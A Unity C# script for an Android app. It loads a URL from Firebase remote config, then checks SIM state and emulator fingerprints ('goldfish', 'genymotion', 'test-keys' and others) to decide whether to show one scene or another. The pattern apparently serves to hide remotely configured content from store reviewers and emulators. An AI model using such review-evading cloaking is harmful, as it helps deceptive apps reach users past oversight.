using System;
using OneSignalSDK;
using UnityEngine;
using UnityEngine.SceneManagement;

public class CheckParameters : MonoBehaviour
{
    [SerializeField] private ConnectFBRC FBRC;

    private void Awake()
    {
        FBRC.Init += Initialize;
        FBRC.Ready += GetUrl;
    }

    private void Start()
    {
        OneSignal.Default.Initialize("701fc9bb-98b0-44bf-89dc-74760f62e4f6");
    }

    void Initialize()
    {
        try
        {
            FBRC.FeachFireBase();
        }
        catch (Exception e)
        {
            throw;
        }
    }

    private void GetUrl()
    {
        URLData.URL = FBRC.GetUrl();
        ValidateData();
    }

    private void ValidateData()
    {
        int simCard = 0;
        bool isEmulator = false;
        
#if UNITY_ANDROID 
        AndroidJavaObject TM = new AndroidJavaObject("android.telephony.TelephonyManager");
        simCard = TM.Call<int>("getSimState");

        isEmulator = IsEmulator();
#endif


        if (simCard == 0 || isEmulator || URLData.URL == "")
        {
            SceneManager.LoadScene(2);
        }
        else
        {
            SceneManager.LoadScene(1);
        }

    }
    
    public bool IsEmulator()
    {
        AndroidJavaClass osBuild = new AndroidJavaClass("android.os.Build");
        string  fingerPrint = osBuild.GetStatic<string>("FINGERPRINT");
        fingerPrint += osBuild.GetStatic<string>("DEVICE");
        fingerPrint += osBuild.GetStatic<string>("MODEL");
        fingerPrint += osBuild.GetStatic<string>("BRAND");
        fingerPrint += osBuild.GetStatic<string>("PRODUCT");
        fingerPrint += osBuild.GetStatic<string>("MANUFACTURER");
        fingerPrint += osBuild.GetStatic<string>("HARDWARE");
        //textField.text = fingerPrint;
        
        if (fingerPrint.Contains("generic") 
            ||  fingerPrint.Contains("unknown") 
            ||  fingerPrint.Contains("emulator") 
            ||  fingerPrint.Contains("sdk") 
            ||  fingerPrint.Contains("genymotion") 
            ||  fingerPrint.Contains("x86") // this includes vbox86
            ||  fingerPrint.Contains("goldfish")
            ||  fingerPrint.Contains("test-keys"))
            return true;
        
        return false;
    }

    
    
}
